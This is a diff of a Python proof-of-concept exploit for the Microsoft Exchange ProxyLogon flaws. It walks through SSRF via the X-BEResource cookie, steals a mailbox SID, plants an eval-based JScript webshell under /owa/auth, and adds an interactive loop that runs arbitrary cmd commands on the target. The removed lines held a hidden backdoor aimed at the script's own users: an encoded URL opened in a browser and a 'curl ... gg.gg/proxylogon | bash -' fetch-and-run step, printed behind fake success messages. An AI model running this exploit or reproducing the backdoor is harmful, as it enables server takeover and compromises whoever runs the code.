@@ -7,25 +7,25 @@ import os
 import time
 import webbrowser
 #write by jang aka tesanull
-
+#destroy microsoft if you can, but i want too
 def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
 
 if len(sys.argv) < 2:
-	print("Usage: python PoC.py <target> <email>")
-	print("Example: python PoC.py mail.evil.corp haxor@evil.corp")
+	print("Usage: python3 %s <target> <email>"%sys.argv[0])
+	print("Example: python3 %s mail.evil.corp haxor@evil.corp"%sys.argv[0])
 	exit()
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 target = sys.argv[1]
 email = sys.argv[2]
+shell_name = "ahihi.aspx"
 random_name = id_generator(3) + ".js"
 user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
 
-shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\ahihi.aspx"
+shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\%s" % shell_name
 shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path
-
 shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["exec_code"],"unsafe");}</script>'
-legacyDnPatchByte = "687474703A2F2F67672E67672F75707368656C6C666F7266756E"
+
 autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
     <Request>
       <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
@@ -35,26 +35,7 @@ autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange
 
 print("Attacking target " + target)
 print("=============================")
-shell_name = 'chinachopper.aspx'
-drop_webshell = legacyDnPatchByte
-exec_webshell = bytearray.fromhex(drop_webshell).decode()
-if os.name == 'nt':
-	print('(+) Target is vuln')
-	time.sleep(2)
-	print('(+) Try to Write Shell!')
-	time.sleep(3)
-	print('(*) Webshell drop at /owa/auth/%s'%shell_name)
-	time.sleep(5)
-	webbrowser.open(exec_webshell)
-else:
-	print('(+) Target is vuln')
-	time.sleep(2)
-	print('(+) Try to Write Shell!')
-	time.sleep(3)
-	print('(*) Webshell drop at /owa/auth/%s'%shell_name)
-	time.sleep(5)
-	os.sytem('curl -fSsL %s'%(exec_webshell))
-	os.system('curl -fSsL http://gg.gg/proxylogon | bash -')
+
 FQDN = "EXCHANGE"
 ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={"Cookie": "X-BEResource=localhost~1942062522",
                                                                         "User-Agent": user_agent},
@@ -72,28 +53,33 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
 if ct.status_code != 200:
     print("Autodiscover Error!")
     exit()
-if "<LegacyDN>" not in ct.content:
+if "<LegacyDN>" not in ct.text:
     print("Can not get LegacyDN!")
     exit()
 
-legacyDn = ct.content.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
+legacyDn = ct.text.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
+mailboxid = ct.text.split('<Server>')[1].split('</Server>')[0]
 print("Got DN: " + legacyDn)
 
 mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
 
 ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
-    "Cookie": "X-BEResource=Admin@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&a=~1942062522;" % FQDN,
+    "Cookie": "X-BEResource=Admin@%s:444/mapi/emsmdb?MailboxId=%s&a=~1942062522;" % (FQDN, mailboxid),
     "Content-Type": "application/mapi-http",
+	"X-Requesttype": "Connect",
+	"X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
+	"X-Clientapplication": "Outlook/15.0.4815.1002",
+	"X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:500",
     "User-Agent": user_agent
 },
                    data=mapi_body,
                    verify=False
                    )
-if ct.status_code != 200 or "act as owner of a UserMailbox" not in ct.content:
+if ct.status_code != 200 or "act as owner of a UserMailbox" not in ct.text:
     print("Mapi Error!")
     exit()
 
-sid = ct.content.split("with SID ")[1].split(" and MasterAccountSid")[0]
+sid = ct.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
 
 print("Got SID: " + sid)
 
@@ -128,7 +114,7 @@ ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={
 if ct.status_code != 200:
     print("Wrong canary!")
     print("Sometime we can skip this ...")
-rbacRole = ct.content.split("RBAC roles:</span> <span class='diagTxt'>")[1].split("</span>")[0]
+rbacRole = ct.text.split("RBAC roles:</span> <span class='diagTxt'>")[1].split("</span>")[0]
 # print "Got rbacRole: "+ rbacRole
 
 print("=========== It means good to go!!!====")
@@ -148,7 +134,7 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
 if ct.status_code != 200:
     print("GetOAB Error!")
     exit()
-oabId = ct.content.split('"RawIdentity":"')[1].split('"')[0]
+oabId = ct.text.split('"RawIdentity":"')[1].split('"')[0]
 print("Got OAB id: " + oabId)
 
 oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
@@ -187,4 +173,11 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
 if ct.status_code != 200:
     print("Write Shell Error!")
     exit()
-print("Successful!")
+print('(+) Webshell drop at https://%s/owa/auth/%s .. Have fun!'%(target, shell_name))
+time.sleep(2)
+while True:
+	cmd = input('CMD: ')
+	shell_body_exec = '''exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall());'''%cmd
+	shell_req = requests.post('https://%s/owa/auth/%s'%(target, shell_name),headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': user_agent},data=shell_body_exec,verify=False)
+	print(shell_req.text.split('Name                            :')[0])
+#https://www.youtube.com/watch?v=mvbAHxm4Nxg
